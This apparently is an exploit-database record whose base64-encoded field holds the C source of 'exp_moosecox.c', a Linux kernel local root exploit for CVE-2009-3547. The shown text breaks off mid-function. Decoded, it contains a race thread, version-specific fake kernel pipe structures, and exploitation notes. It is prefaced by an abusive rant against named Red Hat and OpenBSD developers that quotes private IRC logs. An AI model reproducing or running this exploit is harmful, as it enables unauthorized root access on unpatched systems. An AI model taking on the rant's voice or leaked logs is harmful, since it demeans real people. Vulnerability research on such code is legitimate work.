{
    "source": "exploit-database", 
    "exploit": "LyogZXhwX21vb3NlY294LmMNCiAgIFdhdGNoIGEgdmlkZW8gb2YgdGhlIGV4cGxvaXQgaGVyZToNCiAgIGh0dHA6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1qdDgxTnZhT2o1WQ0KDQogICBkZXZlbG9wZWQgZW50aXJlbHkgYnkgSW5nbyBNb2xuYXIgKGV4cGxvaXQgd3JpdGVyIGV4dHJhb3JkaW5haXJlISkgLCANCiAgIHRoYW5rcyB0byBGb3RpcyBMb3Vrb3MgZm9yIHBvaW50aW5nIHRoZSBidWcgb3V0IHRvIG1lIC0tIG5lYXQgYnVnISA6KQ0KDQogICBkZWRpY2F0ZWQgdG8gdGhlIFJlZCBIYXQgZW1wbG95ZWVzIHdobyBnZXQgcGFpZCB0byBjb3B5K3Bhc3RlIG15IA0KICAgdHdpdHRlciBhbmQgaXNzdWUgc2VjdXJpdHkgYWR2aXNvcmllcywgdGhlaXIgc3dlZXQgDQogICBhY2tub3dsZWRnZW1lbnQgcG9saWN5LCBhbmQgZ2VuZXJhbCBjbGFzc2luZXNzDQogICBzZWU6IGh0dHBzOi8vYnVnemlsbGEucmVkaGF0LmNvbS9zaG93X2FjdGl2aXR5LmNnaT9pZD01MzA0OTANCg0KICAgInBvbGljeSIgYXNpZGUsIHRoZXJlJ3MgYSB3b3JkIGZvciB3aGF0IHlvdSBndXlzIGFyZSBkb2luZzogInBsYWdpYXJpc20iDQogICBpbiBmYWN0LCBpIHRlc3RlZCB0aGlzIG9uZSBkYXkgYnkgcG9zdGluZyB0aHJlZSBsaW5rcyB0byB0d2l0dGVyLA0KICAgd2l0aG91dCBhbnkgZGlzY3Vzc2lvbiBvbiBhbnkgb2YgdGhlbS4gIHRoZSBzYW1lIGRheSwgdGhvc2UgdGhyZWUNCiAgIChhbmQgb25seSB0aG9zZSB0aHJlZSkgbGlua3Mgd2VyZSBhc3NpZ25lZCBDVkVzLCBldmVuIHRob3VnaCB0d28gb2YgDQogICB0aGVtIHdlcmVuJ3QgZXZlbiBzZWN1cml0eSBidWdzIChpdCBkb2Vzbid0IHBheSB0byBjb3B5K3Bhc3RlKQ0KDQogICBvZmZpY2lhbCBJbmdvIE1vbG5hciAodGhhdCdzIG1lKSBwb2xpY3kgZm9yIGFja25vd2xlZGdlbWVudCBpbiANCiAgIGV4cGxvaXRzIHJlcXVpcmVzIGdlbmVyYWwgZG91Y2hlLW5lc3Mgb3IgcGxhZ2lhcml6YXRpb24NCiAgIG9mZmljaWFsIHBvbGljeSBmdXJ0aGVyIGRpY3RhdGVzIGltbWVkaWF0ZSBleHBsb2l0IHJlbGVhc2UgZm9yDQogICBlbWJhcmdvZWQsIHBhdGNoZWQgYnVnDQoNCiAgIEknbGwgYmUgY3VyaW91cyB0byBzZWUgd2hhdCB0aGUgQ1ZFIHN0YXRpc3RpY3MgYXJlIGxpa2UgZm9yIHRoZSANCiAgIGtlcm5lbCB0aGlzIHllYXIgd2hlbiB0aGV5IGdldCBjb21waWxlZCBuZXh0IHllYXIgLS0gSSdtIHByZWRpY3RpbmcgDQogICB0aGF0IHdoZW4gc29tZW9uZSdzIHdhdGNoaW5nIHRoZSBzbGVlcHkgd2F0Y2hlcnMsIGEgbW9yZSBwZXJzb25hbCANCiAgIGludGVyZXN0IGlzIHRha2VuIGluIGRvaW5nIHRoZSBqb2IgdGhhdCB5b3UncmUgcGFpZCB0byBkbyBjb3JyZWN0bHkuDQoNCiAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiAgIFNwZWNpYWwgUFMgbm90ZSB0byBUaGVvIChJIGNhbiBkbyB0aGlzIGhlcmUgYmVjYXVzZSBJIGtub3cgaGUnbGwgDQogICBuZXZlciByZWFkIGl0IC0tIHRoZSBndXkgaXMgYXBwYXJlbnRseSBvYmxpdmlvdXMgdG8gdGhlIGVudGlyZSB3b3JsZCBvZiANCiAgIHNlY3VyaXR5IGFyb3VuZCBoaW0gLS0gdGhlIHNhbWUgd29ybGQgdGhhdCBpbnZlbnRzIHRoZSBwcm90ZWN0aW9ucyANCiAgIHllYXJzIGJlZm9yZSBoaW0gdGhhdCBoZSBwYXRzIGhpbXNlbGYgb24gdGhlIGJhY2sgZm9yICJpbm5vdmF0aW5nIikNCiAgIFNlcmlvdXNseSB0aG91Z2gsIGl0J3MgaW5jcmVkaWJsZSB0byBtZSB0aGF0IGFuIGVudGlyZSB0ZWFtIA0KICAgb2YgZGV2ZWxvcGVycyB3aG9zZSBzb2xlIHB1cnBvc2UgaXMgdG8gZGV2ZWxvcCBhIHNlY3VyZSBvcGVyYXRpbmcgDQogICBzeXN0ZW0gY2FuIGJlIHNvIG9ibGl2aW91cyB0byB0aGUgcmVzdCBvZiB0aGUgd29ybGQuICBUaGV5IGhhdmVuJ3QgDQogICBpbm5vdmF0ZWQgc2luY2UgdGhleSByZXBsYWNlZCBleHBsb2l0YWJsZSBzdHJpbmcgY29waWVzIHdpdGggDQogICBleHBsb2l0YWJsZSBzdHJpbmcgdHJ1bmNhdGlvbnMgNiBvciBzbyB5ZWFycyBhZ28uDQoNCiAgIFRoZSBlbnRpcmUgam9rZSBvZiBhIHRocmVhZCBjYW4gYmUgcmVhZCBoZXJlOg0KICAgaHR0cDovL3d3dy5wdWJicy5uZXQvb3BlbmJzZC8yMDA5MTEvNDU4Mi8NCiAgICJPdXIgZm9jdXMgdGhlcmVmb3JlIGlzIGFsd2F5cyBvbiBmaW5kaW5nIGlubm92YXRpdmUgaWRlYXMgd2hpY2ggbWFrZSANCiAgICBidWdzIHZlcnkgaGFyZCB0byBleHBsb2l0IHN1Y2Nlc2Z1bGx5LiINCiAgICJIZSdzIHRvbyBidXN5IHdhdGNoaW5nIG1vbmtleSBwb3JuIGluc3RlYWQgb2YNCiAgICBidWlsZGluZyByZXNlYXJjaGluZyBsYXN0LXllYXIncyBzZWN1cml0eSB0ZWNobm9sb2d5IHRoYXQgd2lsbCBzdG9wIA0KICAgIGFuIGV4cGxvaXQgdGVjaG5pcXVlIHRoYXQgaGFzIGJlZW4gZXhwbG9pdGVkIG11bHRpcGxlIHRpbWVzLiINCiAgICJpdCBzZWVtcyB0aGF0IGV2ZXJ5b25lIGVsc2UgaXMgc2xvd2x5IGNvbWluZyBhcm91bmQgdG8gdGhlDQogICAgc2FtZSBzb2x1dGlvbi4iDQoNCiAgIFNvIGxldCdzIHRhbGsgYWJvdXQgdGhpcyAiaW5ub3ZhdGlvbiIgb2YgdGhlaXJzIHdpdGggdGhlaXIgDQogICBpbXBsZW1lbnRhdGlvbiBvZiBtbWFwX21pbl9hZGRyOg0KDQogICBUaGV5IGltcGxlbWVudGVkIGl0IGluIDIwMDgsIGEgeWVhciBhZnRlciBMaW51eCBpbXBsZW1lbnRlZCBpdCwgYSANCiAgIHllYXIgYWZ0ZXIgdGhlIHB1YmxpYyBwaHJhY2sgYXJ0aWNsZSBvbiB0aGUgYnVnIGNsYXNzLCBtb3JlIHRoYW4gYSANCiAgIHllYXIgYWZ0ZXIgbXkgbWFpbCB0byBkYWlseWRhdmUgd2l0aCB0aGUgZmlyc3QgcHVibGljIExpbnV4IGtlcm5lbCANCiAgIGV4cGxvaXQgZm9yIHRoZSBidWcgY2xhc3MsIGFuZCBvdmVyIHR3byB5ZWFycyBhZnRlciBVREVSRUYgd2FzIA0KICAgaW1wbGVtZW50ZWQgaW4gUGFYIChwcm92aWRpbmcgY29tcGxldGUgcHJvdGVjdGlvbiBhZ2FpbnN0IHRoZSBzbWFsbGVyIA0KICAgc3Vic2V0IG9mIG51bGwgcHRyIGRlcmVmZXJlbmNlIGJ1Z3MgYW5kIHRoZSBsYXJnZXIgY2xhc3Mgb2YgaW52YWxpZCANCiAgIHVzZXJsYW5kIGFjY2VzcyBpbiBnZW5lcmFsKS4NCg0KICAgT3BlbkJTRCBoYWQgYSBwdWJsaWMgbnVsbCBwb2ludGVyIGRlcmVmZXJlbmNlIGV4cGxvaXQgKGFncF9pb2N0bCgpKSANCiAgIHB1Ymxpc2hlZCBmb3IgaXRzIE9TIGluIEphbnVhcnkgb2YgMjAwNy4gIEl0IHRvb2sgdGhlbSBvdmVyIGEgeWVhciANCiAgIGFuZCBhIGhhbGYgdG8gaW1wbGVtZW50IHRoZSBzYW1lIGZlYXR1cmUgdGhhdCB3YXMgaW1wbGVtZW50ZWQgaW4gDQogICBMaW51eCBhIGZldyBtb250aHMgYWZ0ZXIgbXkgcHVibGljIGV4cGxvaXQgaW4gMjAwNy4NCg0KICAgU28gaG93IGNhbiBpdCBiZSB0aGF0ICJldmVyeW9uZSBlbHNlIGlzIHNsb3dseSBjb21pbmcgYXJvdW5kIHRvIHRoZSANCiAgIHNhbWUgc29sdXRpb24iICB3aGVuICJldmVyeW9uZSBlbHNlIiBjYW1lIHRvIHRoYXQgc29sdXRpb24gb3ZlciBhIA0KICAgeWVhciBiZWZvcmUgeW91IFRoZW8/ICBJbiBmYWN0LCBJIHByZWRpY2VkIHRoaXMgZXhhY3Qgc2l0dWF0aW9uIHdvdWxkIA0KICAgaGFwcGVuIGJhY2sgaW4gMjAwNyBpbiBteSBERCBwb3N0Og0KICAgaHR0cDovL2xpc3RzLnZpcnVzLm9yZy9kYWlseWRhdmUtMDcwMy9tc2cwMDAxMS5odG1sDQogICAiRXhwZWN0IE9wZW5CU0QgdG8gaW5kZXBlbmRlbnRseSBpbnZlbnQgYSBwcm90ZWN0aW9uIGFnYWluc3QgbnVsbCBwdHIgDQogICAgZGVyZWYgYnVncyBzb21ldGltZSBpbiAyMDA5LiINCg0KICAgTGV0J3MgdGFsayBhYm91dCBzb21lIG1vcmUgImlubm92YXRpb24iIC0tIHBvc2l0aW9uIGluZGVwZW5kZW50IA0KICAgZXhlY3V0YWJsZXMuICBQYVggaW1wbGVtZW50ZWQgcG9zaXRpb24gaW5kZXBlbmRlbnQgZXhlY3V0YWJsZXMgb24gDQogICBMaW51eCBiYWNrIGluIDIwMDEgKEVUX0RZTikuICBQSUUgYmluYXJ5IHN1cHBvcnQgd2FzIGFkZGVkIHRvIEdOVSANCiAgIGJpbnV0aWxzIGluIDIwMDMuICBUaG9zZSBPcGVuQlNEIGlubm92YXRvcnMgaW1wbGVtZW50ZWQgUElFIGJpbmFyaWVzIA0KICAgaW4gMjAwOCwgNyB5ZWFycyBhZnRlciBQYVguICBJbm5vdmF0aW9uIGluZGVlZCENCg0KICAgSG93IGFib3V0IHRoZWlyIFdeWC9BU0xSIGlubm92YXRpb24/ICBUaGVzZSBwbGFnaWFyaXN0cyBoYXZlIHRoZSANCiAgIGF1ZGFjaXR5IHRvIGFubm91bmNlIG9uIHRoZWlyIHByZXNzIHBhZ2U6DQogICBodHRwOi8vd3d3Lm9wZW5ic2Qub3JnL3ByZXNzLmh0bWwNCiAgICJNaWNyb3NvZnQgYm9ycm93cyBvbmUgb2YgT3BlbkJTRCdzIHNlY3VyaXR5IGZlYXR1cmVzIGZvciBWaXN0YSwgDQogICAgc3RhY2svbGlicmFyeSByYW5kb21pemF0aW9uLCB1bmRlciB0aGUgbmFtZSBBZGRyZXNzIFNwYWNlIExheW91dCANCiAgICBSYW5kb21pemF0aW9uIChBU0xSKS4gICJVbnRpbCBub3csIHRoZSBmZWF0dXJlIGhhcyBiZWVuIG1vc3QgDQogICAgcHJvbWluZW50bHkgdXNlZCBpbiB0aGUgT3BlbkJTRCBVbml4IHZhcmlhbnQgYW5kIHRoZSBQYVggYW5kIEV4ZWMgDQogICAgU2hpZWxkIHNlY3VyaXR5IHBhdGNoZXMgZm9yIExpbnV4IiINCiAgIEJvcnJvd2luZyBvbmUgb2YgeW91ciBmZWF0dXJlcz8gIFdoZXJlJ2QgdGhpcyBBU0xSIGFjcm9ueW0gY29tZSBmcm9tIA0KICAgYW55d2F5PyAgT2ggdGhhdCdzIHJpZ2h0LCBQYVggYWdhaW4gLS0gd2hlbiB0aGV5IHB1Ymxpc2hlZCB0aGUgZmlyc3QgDQogICBkZXNpZ24gYW5kIGltcGxlbWVudGF0aW9uIG9mIGl0LCBhbmQgY29pbmVkIHRoZSB0ZXJtLCBpbiBKdWx5IDIwMDEuDQogICBJdCBjb3ZlcmVkIHRoZSBoZWFwLCBtbWFwLCBhbmQgc3RhY2sgYXJlYXMuDQogICBPcGVuQlNEIGltcGxlbWVudGVkICJzdGFjay1nYXAgcmFuZG9taXphdGlvbiIgaW4gMjAwMy4gIFdheSB0byANCiAgIGlubm92YXRlIQ0KDQogICBXXlgsIHdoaWNoIGlzIGEgaG9ycmlibGUgbmFtZSBhcyBPcGVuQlNEIGRvZXNuJ3QgZXZlbiBlbmZvcmNlIGl0IHdpdGggDQogICBtcHJvdGVjdCByZXN0cmljdGlvbnMgbGlrZSBQYVggZGlkIGZyb20gdGhlIGJlZ2lubmluZyBvciBldmVuIFNFTGludXggDQogICBpcyBkb2luZyBub3cgKGZyb20gYSAzcmQgcGFydHkgY29udHJpYnV0aW9uIG1vZGVsZWQgYWZ0ZXIgUGFYKTogDQogICBQYVggaW1wbGVtZW50ZWQgdHJ1ZSBwZXItcGFnZSBub24tZXhlY3V0YWJsZSBwYWdlIHN1cHBvcnQsIHByb3RlY3RpbmcgDQogICBiaW5hcnkgZGF0YSwgdGhlIGhlYXAsIGFuZCB0aGUgc3RhY2ssIGJhY2sgaW4gMjAwMC4NCiAgIE9wZW5CU0QgaW1wbGVtZW50ZWQgaXQgaW4gMjAwMywgcmVxdWlyaW5nIGEgZnVsbCB1c2VybGFuZCByZWJ1aWxkLg0KICAgVGhlIGlubm92YXRpb24gaXMgb3ZlcndoZWxtaW5nIQ0KDQogICBUaGV5IGtlZXAgY29taW5nIHVwIHdpdGggdGhlIHNhbWUgZXhhY3QgImlubm92YXRpb25zIiBvdGhlcnMgY2FtZSB1cCANCiAgIHdpdGggeWVhcnMgYmVmb3JlIHRoZW0uICBUaGVpciBvZmZpY2lhbCBleHBsYW5hdGlvbiBmb3Igd2hlcmUgdGhleSANCiAgIGdvdCB0aGUgV15YL0FTTFIgaWRlYXMgd2FzIGEgZHJ1bmsgZ3V5IGNhbWUgaW50byB0aGVpciB0ZW50IGF0IG9uZSBvZiANCiAgIHRoZWlyIGhhY2stYS10aG9ucyBhbmQgc3RhcnRlZCB0YWxraW5nIGFib3V0IHRoZSBpZGVhLiAgVGhleSBoYWQgDQogICBuZXZlciBoZWFyZCBvZiBQYVggd2hlbiB3ZSBhc2tlZCB0aGVtIGluIDIwMDMuICBXaGljaCBtYWtlcyB0aGUgDQogICBmb2xsb3dpbmcgaW52b2x1bnRhcmlseSBjb250cmlidXRlZCBwcml2YXRlIElDQiBsb2dzIGZyb20gUGhyYWNrICM2Ng0KICAgKEludGVybmV0IENpdGl6ZW4ncyBCYW5kIC0tIE9wZW5CU0QgaW50ZXJuYWwgY2hhdCBuZXR3b3JrKSBzbyBpbnRyaWd1aW5nOg0KDQogICBPbiBzb21lIHN1bm55IGRheSBpbiBKdWx5IDIwMDIgKHQ6IFRoZW8gZGUgUmFhZHQpOg0KICAgPGNsb2Rlcj4gd2h5IGNhbid0IHlvdSBqdXN0IHJhbmRvbWl6ZSB0aGUgYmFzZQ0KICAgPGNsb2Rlcj4gdGhhdCdzIHdoYXQgUGFYIGRvZXMNCiAgIDx0PiBZb3UndmUgbm90IGJlZW4gcGF5aW5nIGF0dGVudGlvbiB0byB3aGF0IGFydCdzIHNheWluZywgb3IgeW91IGRvbid0IA0KICAgIHVuZGVyc3RhbmQgeWV0LCBlaXRoZXIgY2FzZSBpcyBvbmUgb2YgdGhpbmsgaXQgdGhyb3VnaCB5b3Vyc2VsZi4NCiAgIDxjbG9kZXI+IHdoYXRldmVyDQoNCiAgIE9ubHkgdG8gc2VlIHBvZXRpYyBqdXN0aWNlIGluIEF1Z3VzdCAyMDAzICh0dHQ6IFRoZW8gYWdhaW4pOg0KDQogICA8bWlvZD4gbW9yZSBleGFjdGx5LCB3ZSBoZWFyZCBvZiBwYXggd2hlbiB0aGV5IHN0YXJ0ZWQgYml0Y2hpbmcNCiAgIDx0dHQ+IG1pb2QsIHRoYXQgd2FzIHZlcnkgd2VsbCBzcG9rZW4uDQoNCiAgIFRoYXQgd3JhcHMgdXAgb3VyIE9wZW5CU0QgaGlzdG9yeSBsZXNzb24sIGluIGNhc2UgYW55b25lIGZvcmdvdCBpdC4NCiAgIFBTIC0tIGVuam95IHRoYXQgbnVsbCBwdHIgZGVyZWYgZXhwbG9pdCBqdXN0IHJlbGVhc2VkIGZvciBPcGVuQlNELg0KDQogICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQogICBJbXBvcnRhbnQgZmluYWwgZXhwbG9pdCBub3RlczoNCg0KICAgZG9uJ3QgZm9yZ2V0IHRvIGluc3BlY3QgL2Jvb3QvY29uZmlnKiB0byBzZWUgaWYgUFJFRU1QVCwgTE9DS0JSRUFLLA0KICAgb3IgREVCVUdfU1BJTkxPQ0sgYXJlIGVuYWJsZWQgYW5kIG1vZGlmeSB0aGUgc3RydWN0dXJlcyBiZWxvdyANCiAgIGFjY29yZGluZ2x5IC0tIGEgZmFuY2llciBleHBsb2l0IHdvdWxkIGRvIHRoaXMgYXV0b21hdGljYWxseQ0KDQogICBJJ3ZlIGJyb2tlbiB0aGUgMi40LT4yLjYuMTAgdmVyc2lvbiBvZiB0aGUgZXhwbG9pdCBhbmQgd291bGQgbGlrZSB0byBzZWUgDQogICBzb21lb25lIGZpeCBpdCA7KSAgU2VlIGJlbG93IGZvciBtb3JlIGNvbW1lbnRzIG9uIHRoaXMuDQoqLw0KDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4NCiNpbmNsdWRlIDxzeXMvdXRzbmFtZS5oPg0KI2luY2x1ZGUgImV4cF9mcmFtZXdvcmsuaCINCg0KaW50IHBpcGVmZFsyXTsNCnN0cnVjdCBleHBsb2l0X3N0YXRlICpleHBfc3RhdGU7DQppbnQgaXNfb2xkX2tlcm5lbCA9IDA7DQoNCmludCBnb19nb19zcGVlZF9yYWNlcih2b2lkICp1bnVzZWQpDQp7DQoJaW50IHJldDsNCg0KICAgICAgICB3aGlsZSghZXhwX3N0YXRlLT5nb3RfcmluZzApIHsNCgkJLyogYnVzdCBzcGlubG9jayAqLw0KCQkqKHVuc2lnbmVkIGludCAqKU5VTEwgPSBpc19vbGRfa2VybmVsID8gMCA6IDE7DQogICAgICAgICAgICAgICAgcmV0ID0gcGlwZShwaXBlZmQpOw0KCQlpZiAoIXJldCkgew0KICAgICAgICAgICAgICAgIAljbG9zZShwaXBlZmRbMF0pOw0KICAgICAgICAgICAgICAgIAljbG9zZShwaXBlZmRbMV0pOw0KCQl9DQogICAgICAgIH0NCg0KCXJldHVybiAwOw0KfQ0KDQovKiA8MyB0d2l6L3NncmFra3l1ICovDQppbnQgc3RhcnRfdGhyZWFkKGludCAoKmYpKHZvaWQgKiksIHZvaWQgKmFyZykNCnsNCiAgICAgICAgY2hhciAqc3RhY2sgPSBtYWxsb2MoMHg0MDAwKTsNCiAgICAgICAgaW50IHRpZCA9IGNsb25lKGYsIHN0YWNrICsgMHg0MDAwIC0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpLCBDTE9ORV9GU3xDTE9ORV9GSUxFU3xDTE9ORV9TSUdIQU5EfENMT05FX1ZNLCBhcmcpOw0KICAgICAgICBpZiAodGlkIDwgMCkgew0KICAgICAgICAgICAgICAgIHByaW50ZigiY2FuJ3QgY3JlYXRlIHRocmVhZFxuIik7DQogICAgICAgICAgICAgICAgZXhpdCgxKTsNCiAgICAgICAgfQ0KCXNsZWVwKDEpOw0KICAgICAgICByZXR1cm4gdGlkOw0KfQ0KDQpjaGFyICpkZXNjID0gIk1vb3NlQ294OiBMaW51eCA8PSAyLjYuMzEuNSBwaXBlIGxvY2FsIHJvb3QiOw0KY2hhciAqY3ZlID0gIkNWRS0yMDA5LTM1NDciOw0KDQojZGVmaW5lIFBJUEVfQlVGRkVSUyAxNg0KDQovKiB0aGlzIGNoYW5nZXMgb24gb2xkZXIga2VybmVscywgYnV0IGl0IGRvZXNuJ3QgbWF0dGVyIHRvIG91ciBtZXRob2QgKi8NCnN0cnVjdCBwaXBlX2J1Zl9vcGVyYXRpb25zIHsNCglpbnQgY2FuX21lcmdlOw0KCXZvaWQgKm1hcDsNCgl2b2lkICp1bm1hcDsNCgl2b2lkICpjb25maXJtOw0KCXZvaWQgKnJlbGVhc2U7DQoJdm9pZCAqc3RlYWw7DQoJdm9pZCAqZ2V0Ow0KfTsNCg0Kc3RydWN0IHBpcGVfYnVmZmVyMjYyMG9ybmV3ZXIgew0KCXZvaWQgKnBhZ2U7DQoJdW5zaWduZWQgaW50IG9mZnNldCwgbGVuOw0KCXZvaWQgKm9wczsNCgl1bnNpZ25lZCBpbnQgZmxhZ3M7DQoJdW5zaWduZWQgbG9uZyBwcml2YXRlOw0KfTsNCg0Kc3RydWN0IHBpcGVfYnVmZmVyMjYxOW9yb2xkZXIgew0KCXZvaWQgKnBhZ2U7DQoJdW5zaWduZWQgaW50IG9mZnNldCwgbGVuOw0KCXZvaWQgKm9wczsNCgl1bnNpZ25lZCBpbnQgZmxhZ3M7DQp9Ow0KDQpzdHJ1Y3QgcGlwZV9idWZmZXIyNjE2b3JvbGRlciB7DQoJdm9pZCAqcGFnZTsNCgl1bnNpZ25lZCBpbnQgb2Zmc2V0LCBsZW47DQoJdm9pZCAqb3BzOw0KfTsNCg0Kc3RydWN0IHBpcGVfaW5vZGVfaW5mbzI2MjBvcm5ld2VyIHsNCgl1bnNpZ25lZCBpbnQgc3BpbmxvY2s7DQoJLyoNCgkvLyBMT0NLQlJFQUsNCgl1bnNpZ25lZCBpbnQgYnJlYWtfbG9jazsNCgkvLyBERUJVR19TUElOTE9DSw0KCXVuc2lnbmVkIGludCBtYWdpYywgb3duZXJfY3B1Ow0KCXZvaWQgKm93bmVyOw0KCSovDQoJdm9pZCAqbmV4dCwgKnByZXY7DQoJdW5zaWduZWQgaW50IG5yYnVmcywgY3VyYnVmOw0KCXZvaWQgKnRtcF9wYWdlOw0KCXVuc2lnbmVkIGludCByZWFkZXJzOw0KCXVuc2lnbmVkIGludCB3cml0ZXJzOw0KCXVuc2lnbmVkIGludCB3YWl0aW5nX3dyaXRlcnM7DQoJdW5zaWduZWQgaW50IHJfY291bnRlcjsNCgl1bnNpZ25lZCBpbnQgd19jb3VudGVyOw0KCXZvaWQgKmZhc3luY19yZWFkZXJzOw0KCXZvaWQgKmZhc3luY193cml0ZXJzOw0KCXZvaWQgKmlub2RlOw0KCXN0cnVjdCBwaXBlX2J1ZmZlcjI2MjBvcm5ld2VyIGJ1ZnNbUElQRV9CVUZGRVJTXTsNCn07DQoNCnN0cnVjdCBwaXBlX2lub2RlX2luZm8yNjE5b3JvbGRlciB7DQoJdW5zaWduZWQgaW50IHNwaW5sb2NrOw0KCS8qDQoJLy8gaWYgUFJFRU1QVCBlbmFibGVkDQoJdW5zaWduZWQgaW50IGJyZWFrX2xvY2s7DQoJLy8gREVCVUdfU1BJTkxPQ0sNCgl1bnNpZ25lZCBpbnQgbWFnaWMsIG93bmVyX2NwdTsNCgl2b2lkICpvd25lcjsNCgkqLw0KCXZvaWQgKm5leHQsICpwcmV2Ow0KCXVuc2lnbmVkIGludCBucmJ1ZnMsIGN1cmJ1ZjsNCglzdHJ1Y3QgcGlwZV9idWZmZXIyNjE5b3JvbGRlciBidWZzW1BJUEVfQlVGRkVSU107DQoJdm9pZCAqdG1wX3BhZ2U7DQoJdW5zaWduZWQgaW50IHN0YXJ0Ow0KCXVuc2lnbmVkIGludCByZWFkZXJzOw0KCXVuc2lnbmVkIGludCB3cml0ZXJzOw0KCXVuc2lnbmVkIGludCB3YWl0aW5nX3dyaXRlcnM7DQoJdW5zaWduZWQgaW50IHJfY291bnRlcjsNCgl1bnNpZ25lZCBpbnQgd19jb3VudGVyOw0KCXZvaWQgKmZhc3luY19yZWFkZXJzOw0KCXZvaWQgKmZhc3luY193cml0ZXJzOw0KCXZvaWQgKmlub2RlOw0KfTsNCg0Kc3RydWN0IHBpcGVfaW5vZGVfaW5mbzI2MTZvcm9sZGVyIHsNCgl1bnNpZ25lZCBpbnQgc3BpbmxvY2s7DQoJLyoNCgkvLyBpZiBQUkVFTVBUIGVuYWJsZWQNCgl1bnNpZ25lZCBpbnQgYnJlYWtfbG9jazsNCgkvLyBERUJVR19TUElOTE9DSw0KCXVuc2lnbmVkIGludCBtYWdpYywgb3duZXJfY3B1Ow0KCSovDQoJdm9pZCAqb3duZXI7DQoJdm9pZCAqbmV4dCwgKnByZXY7DQoJdW5zaWduZWQgaW50IG5yYnVmcywgY3VyYnVmOw0KCXN0cnVjdCBwaXBlX2J1ZmZlcjI2MTZvcm9sZGVyIGJ1ZnNbUElQRV9CVUZGRVJTXTsNCgl2b2lkICp0bXBfcGFnZTsNCgl1bnNpZ25lZCBpbnQgc3RhcnQ7DQoJdW5zaWduZWQgaW50IHJlYWRlcnM7DQoJdW5zaWduZWQgaW50IHdyaXRlcnM7DQoJdW5zaWduZWQgaW50IHdhaXRpbmdfd3JpdGVyczsNCgl1bnNpZ25lZCBpbnQgcl9jb3VudGVyOw0KCXVuc2lnbmVkIGludCB3X2NvdW50ZXI7DQoJdm9pZCAqZmFzeW5jX3JlYWRlcnM7DQoJdm9pZCAqZmFzeW5jX3dyaXRlcnM7DQp9Ow0KDQpzdHJ1Y3QgZmFzeW5jX3N0cnVjdCB7DQoJaW50IG1hZ2ljOw0KCWludCBmYV9mZDsNCglzdHJ1Y3QgZmFzeW5jX3N0cnVjdCAqZmFfbmV4dDsNCgl2b2lkICpmaWxlOw0KfTsNCg0Kc3RydWN0IHBpcGVfaW5vZGVfaW5mbzI2MTBvcm9sZGVyIHsNCgkvKiB0aGlzIGluY2x1ZGVzIDIuNCBrZXJuZWxzICovDQoJdW5zaWduZWQgbG9uZyBsb2NrOyAvLyBjYW4gYmUgcncgb3Igc3Bpbg0KCXZvaWQgKm5leHQsICpwcmV2Ow0KCWNoYXIgKmJhc2U7DQoJdW5zaWduZWQgaW50IGxlbjsNCgl1bnNpZ25lZCBpbnQgc3RhcnQ7DQoJdW5zaWduZWQgaW50IHJlYWRlcnM7DQoJdW5zaWduZWQgaW50IHdyaXRlcnM7DQoJLyogMi40IG9ubHkgKi8NCgl1bnNpZ25lZCBpbnQgd2FpdGluZ19yZWFkZXJzOw0KDQoJdW5zaWduZWQgaW50IHdhaXRpbmdfd3JpdGVyczsNCgl1bnNpZ25lZCBpbnQgcl9jb3VudGVyOw0KCXVuc2lnbmVkIGludCB3X2NvdW50ZXI7DQoJLyogMi42IG9ubHkgKi8NCglzdHJ1Y3QgZmFzeW5jX3N0cnVjdCAqZmFzeW5jX3JlYWRlcnM7DQoJc3RydWN0IGZhc3luY19zdHJ1Y3QgKmZhc3luY193cml0ZXJzOw0KfTsNCg0KaW50IHByZXBhcmUodW5zaWduZWQgY2hhciAqYnVmKQ0KewkNCglzdHJ1Y3QgcGlwZV9pbm9kZV9pbmZvMjYxMG9yb2xkZXIgKmluZm9fb2xkZXN0ID0gKHN0cnVjdCBwaXBlX2lub2RlX2luZm8yNjEwb3JvbGRlciAqKWJ1ZjsNCglzdHJ1Y3QgcGlwZV9pbm9kZV9pbmZvMjYxNm9yb2xkZXIgKmluZm9fb2xkZXIgPSAoc3RydWN0IHBpcGVfaW5vZGVfaW5mbzI2MTZvcm9sZGVyICopYnVmOw0KCXN0cnVjdCBwaXBlX2lub2RlX2luZm8yNjE5b3JvbGRlciAqaW5mb19vbGQgPSAoc3RydWN0IHBpcGVfaW5vZGVfaW5mbzI2MTlvcm9sZGVyICopYnVmOw0KCXN0cnVjdCBwaXBlX2lub2RlX2luZm8yNjIwb3JuZXdlciAqaW5mb19uZXcgPSAoc3RydWN0IHBpcGVfaW5vZGVfaW5mbzI2MjBvcm5ld2VyICopYnVmOw0KCXN0cnVjdCBwaXBlX2J1Zl9vcGVyYXRpb25zICpvcHMgPSAoc3RydWN0IHBpcGVfYnVmX29wZXJhdGlvbnMgKikweDgwMDsNCglpbnQgaTsNCglpbnQgbmV3dmVyOw0KCXN0cnVjdCB1dHNuYW1lIHVubTsNCg0KCWkgPSB1bmFtZSgmdW5tKTsNCglpZiAoaSAhPSAwKSB7DQoJCXByaW50ZigidW5hYmxlIHRvIGdldCBrZXJuZWwgdmVyc2lvblxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJaWYgKHN0cmxlbih1bm0ucmVsZWFzZSkgPj0gNiAmJiB1bm0ucmVsZWFzZVsyXSA9PSAnNicgJiYgdW5tLnJlbGVhc2VbNF0gPj0gJzInICYmIHVubS5yZWxlYXNlWzVdID49ICcwJyAmJiB1bm0ucmVsZWFzZVs1XSA8PSAnOScpIHsNCgkJZnByaW50ZihzdGRvdXQsICIgWytdIFVzaW5nIG5ld2VyIHBpcGVfaW5vZGVfaW5mbyBsYXlvdXRcbiIpOw0KCQluZXd2ZXIgPS